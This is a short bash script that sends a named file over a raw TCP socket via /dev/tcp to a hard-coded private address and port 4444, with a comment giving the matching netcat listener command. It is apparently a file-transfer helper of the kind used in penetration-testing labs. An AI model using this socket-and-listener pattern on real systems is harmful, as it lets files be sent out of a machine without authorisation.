#!/bin/bash
# Send file over raw TCP socket
# nc -lvnp 4444 > received_file.txt


FILE="$1"
HOST="10.11.0.123"
PORT="4444"

if [[ ! -f "$FILE" ]]; then
    echo "File not found: $FILE"
    exit 1
fi

exec 3<>/dev/tcp/$HOST/$PORT
cat "$FILE" >&3
exec 3>&-
